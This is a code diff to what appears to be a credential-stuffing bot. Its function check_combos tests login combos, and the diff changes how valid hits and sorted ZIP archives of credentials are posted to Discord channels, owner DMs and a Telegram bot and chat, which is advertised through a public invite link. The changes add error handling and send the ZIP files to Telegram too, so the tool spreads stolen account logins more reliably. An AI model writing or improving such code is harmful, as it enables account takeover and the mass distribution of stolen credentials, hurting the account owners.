@@ -181,11 +181,12 @@ async def check_combos(combos: list[str], status_msg=None) -> list[str]:
 
 
 # ─── TELEGRAM ────────────────────────────────────────────────────────────────
-async def send_telegram_file(text: str, filename: str):
+async def send_telegram_file(text, filename: str):
     url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
     data = aiohttp.FormData()
     data.add_field("chat_id", TELEGRAM_CHAT)
-    data.add_field("document", text.encode(), filename=filename, content_type="text/plain")
+    content = text.encode() if isinstance(text, str) else text
+    data.add_field("document", content, filename=filename, content_type="application/octet-stream")
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post(url, data=data) as resp:
@@ -472,11 +473,19 @@ async def monitor_loop():
 
                         # Discord — post full file + ZIP (if not mix)
                         if toggles["discord_content"]:
-                            await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
+                            try:
+                                await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
+                                log.info(f"Posted main file to Discord: {filename}")
+                            except Exception as e:
+                                log.error(f"Failed to post main file to Discord: {e}")
                             if sorted_zip:
-                                zip_filename = f"{len(valid_hits)} {label.upper()} SORTED.zip"
-                                await content_channel.send(file=discord.File(fp=sorted_zip, filename=zip_filename))
-                            log.info(f"Posted to Discord as {filename}")
+                                try:
+                                    sorted_zip.seek(0)
+                                    zip_filename = f"{len(valid_hits)} {label.upper()} SORTED.zip"
+                                    await content_channel.send(file=discord.File(fp=sorted_zip, filename=zip_filename))
+                                    log.info(f"Posted ZIP to Discord: {zip_filename}")
+                                except Exception as e:
+                                    log.error(f"Failed to post ZIP to Discord: {e}")
 
                         # DM owner
                         if toggles["owner_dm"]:
@@ -499,6 +508,15 @@ async def monitor_loop():
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                             )
                             await send_telegram_file(tg_header + "\n".join(all_creds), filename)
+
+                            if sorted_zip:
+                                try:
+                                    sorted_zip.seek(0)
+                                    zip_filename = f"{len(valid_hits)} {label.upper()} SORTED.zip"
+                                    await send_telegram_file(sorted_zip.read(), zip_filename)
+                                    log.info(f"Posted ZIP to Telegram: {zip_filename}")
+                                except Exception as e:
+                                    log.error(f"Failed to post ZIP to Telegram: {e}")
 
                             async with aiohttp.ClientSession() as sess:
                                 if toggles["telegram_public"]:
